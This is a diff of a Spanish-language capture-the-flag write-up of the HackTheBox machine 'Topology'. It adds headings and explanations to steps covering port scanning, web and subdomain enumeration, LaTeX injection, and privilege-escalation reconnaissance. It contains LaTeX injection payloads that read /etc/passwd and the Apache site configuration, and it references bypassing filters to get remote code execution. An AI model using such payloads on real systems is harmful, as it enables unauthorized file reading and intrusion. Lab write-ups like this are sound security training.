@@ -21,7 +21,9 @@ layout:
 
 ***
 
+## Reconnaissance
 
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Topology**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.217 -oG allPorts
@@ -45,7 +47,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.73 seconds
            Raw packets sent: 65535 (2.884MB) | Rcvd: 65554 (2.623MB)
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -58,7 +60,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.73 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abierta una página web de `Apache`.
 
 ```bash
 ❯ nmap -sCV -p22,80 10.10.11.217 -A -oN targeted -oX targetedXML
@@ -92,31 +94,36 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 11.05 seconds
 ```
 
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
+
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
+<figure><img src="../../.gitbook/assets/imagen (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/imagen (1) (1).png" alt=""><figcaption></figcaption></figure>
+Añadiremos la siguiente entrada en nuestro archivo `/etc/hosts`.
 
 ```bash
-❯ catnp /etc/hosts | grep topology
+❯ cat /etc/hosts | grep topology
 10.10.11.217 topology.htb 
 ```
 
+## Web Enumeration
 
+Realizaremos una comprobación de las tecnologías que utiliza el sitio web.
 
-```
+```bash
 ❯ whatweb http://topology.htb
 http://topology.htb [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[lklein@topology.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.217], Title[Miskatonic University | Topology Group]
 ```
 
-
+Realizaremos una enumeración de directorios y páginas web de la aplicación web, no logramos obtener ningún resultado interesante.
 
 ```bash
 ❯ feroxbuster -u http://topology.htb/ -t 200 -C 500,502,404
@@ -149,7 +156,7 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 200      GET      174l      545w     6767c http://topology.htb/
 ```
 
-
+Accederemos a [http://topology.htb](http://topology.htb) y nos encontraremos con la siguiente página web.
 
 <figure><img src="../../.gitbook/assets/imagen (2) (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -173,6 +180,10 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 
 
 <figure><img src="../../.gitbook/assets/imagen (5).png" alt=""><figcaption></figcaption></figure>
+
+
+
+### Subdomain Enumeration
 
 
 
@@ -217,7 +228,23 @@ Requests/sec.: 25.28341
 
 
 
+## Initial Access
+
+
+
+### LaTeX Injection
+
+
+
+<figure><img src="../../.gitbook/assets/imagen.png" alt="" width="519"><figcaption></figcaption></figure>
+
+
+
 <figure><img src="../../.gitbook/assets/imagen (7).png" alt=""><figcaption></figcaption></figure>
+
+
+
+### Reading Files with LaTeX Injection
 
 
 
@@ -285,6 +312,10 @@ $\lstinputlisting{/etc/passwd}$
 ```
 
 <figure><img src="../../.gitbook/assets/imagen (10).png" alt=""><figcaption></figcaption></figure>
+
+### Information Lekage
+
+
 
 ```latex
 $\lstinputlisting{/etc/apache2/sites-enabled/000-default.conf}$
@@ -377,6 +408,8 @@ vdaisley@topology:~$ cat user.txt
 
 
 
+### Bypass Restrictions LaTeX Injection to perform Remote Code Execution
+
 otra manera
 
 ```latex
@@ -419,6 +452,12 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
 
 
 
+## Privilege Escalation
+
+### Basic Enumeration
+
+
+
 ```bash
 vdaisley@topology:~$ id
 uid=1007(vdaisley) gid=1007(vdaisley) groups=1007(vdaisley)
@@ -443,6 +482,10 @@ vdaisley@topology:~$ find / -perm -4000 2>/dev/null
 /usr/bin/passwd
 /usr/bin/chfn
 ```
+
+
+
+### Monitoring Processes (Pspy64)
 
 
 
@@ -523,6 +566,8 @@ done
 2025/02/16 19:05:01 CMD: UID=0     PID=3059   | tail -60 /opt/gnuplot/loaddata.dat 
 2025/02/16 19:05:01 CMD: UID=0     PID=3060   | find /opt/gnuplot -name *.plt -exec gnuplot {} ; 
 ```
+
+
 
 
 
